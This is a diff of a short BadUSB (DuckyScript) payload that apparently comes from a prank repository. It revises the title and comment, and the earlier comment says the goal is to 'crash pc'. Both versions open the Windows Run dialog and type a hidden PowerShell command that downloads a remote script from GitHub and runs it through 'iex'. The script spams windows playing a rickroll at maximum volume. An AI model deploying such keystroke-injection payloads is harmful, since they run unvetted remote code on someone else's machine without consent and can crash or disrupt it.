@@ -1,5 +1,5 @@
-REM crash pc by opening rickroll-max-volume a lot of times
+REM Title: Rickroll max volume spam
+REM Description: open rickroll-max-volume a lot of times
 GUI r
 DELAY 500
-STRING powershell -w h irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/window-spammer/rickroll-max-volume-spam.ps1 | iex
-ENTER
+STRINGLN powershell -w h irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/window-spammer/rickroll-max-volume-spam.ps1 | iex
